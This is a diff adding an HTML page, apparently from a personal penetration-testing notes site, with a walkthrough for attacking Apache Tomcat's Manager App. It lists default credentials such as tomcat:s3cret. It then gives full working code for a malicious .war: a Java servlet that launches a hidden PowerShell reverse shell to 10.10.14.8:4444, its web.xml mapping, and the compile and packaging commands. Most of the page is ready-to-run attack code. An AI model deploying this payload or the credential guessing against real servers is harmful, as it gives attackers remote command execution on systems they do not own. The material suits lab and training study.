@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Tomcat (TCP/8080)</h1>
+            <p>Apache Tomcat is a free and open-source web server and servlet container that is primarily used to host Java-based web applications</p>
+        </div>
+        <div class="notion-body">
+            <h2>Enumeration</h2>
+            <b>Manager App section is the most important</b>
+            <ul>
+                <p>Attempt to try default credentials. More can be found <a class="notion-link" href="https://gist.github.com/0xRar/70aae102af56495b7be51486d363c4bd">here</a></p>
+                <ul>
+                    <li>admin : admin</li>
+                    <li>tomcat : s3cret</li>
+                    <li>admin : tomcat</li>
+                </ul>
+            </ul>
+            <h2>Exploitation</h2>
+            <ul>
+                <p>In case you are inside <b>Manager App</b> section you can try to upload a .war file with a reverse shell</p>
+
+                <h3>Developing a .war file (Tomcat in a Windows OS)</h3>
+                Create the following directory structure
+
+                <pre><code class="language-bash">ReverseShell/
+ShellServlet.java
+└── WEB-INF/
+    ├── web.xml
+    └── classes/
+        └── ShellServlet.class</code></pre>
+
+               <p>ShellServlet.java</p>
+                <pre><code class="language-java">import java.io.*;
+import javax.servlet.*;
+import javax.servlet.http.*;
+
+public class ShellServlet extends HttpServlet {
+    public void doGet(HttpServletRequest request, HttpServletResponse response)
+            throws ServletException, IOException {
+        String[] cmd = {"cmd.exe", "/c", "powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.8',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""};
+        Runtime.getRuntime().exec(cmd);
+    }
+}</code></pre>
+
+              <p>web.xml</p>
+              <pre><code class="language-bash">&lt;web-app&gt;<br>
+    &lt;servlet&gt;<br>
+        &lt;servlet-name&gt;ShellServlet&lt;/servlet-name&gt;<br>
+        &lt;servlet-class&gt;ShellServlet&lt;/servlet-class&gt;<br>
+    &lt;/servlet&gt;<br>
+    &lt;servlet-mapping&gt;<br>
+        &lt;servlet-name&gt;ShellServlet&lt;/servlet-name&gt;<br>
+        &lt;url-pattern&gt;/shell&lt;/url-pattern&gt;<br>
+    &lt;/servlet-mapping&gt;<br>
+&lt;/web-app&gt;</code></pre>
+         
+
+              <p>Compile previous java code</p>
+              <p>You must download Java API .jar in order to being able to use the libraries, can be found <a class="notion-link" href="https://repo1.maven.org/maven2/javax/servlet/javax.servlet-api/4.0.1/javax.servlet-api-4.0.1.jar">Here</a></p>
+              <p><b style="color:#ff0000">Important!!</b> The following command must be adapted based on the version of java running in the Tomcat server. In this case is Java 8</p>
+              <pre><code class="language-bash">javac -cp ../javax.servlet-api-4.0.1.jar -source 8 -target 8 -d WEB-INF/classes ShellServlet.java</code></pre>  
+              <p>Creation of .war file</p>
+              <pre><code class="language-bash">jar -cvf reverse.war -C ReverseShell .</code></pre>      
+            </ul>        
+        </div>
+    </div>
+
+
+</body>
+</html>
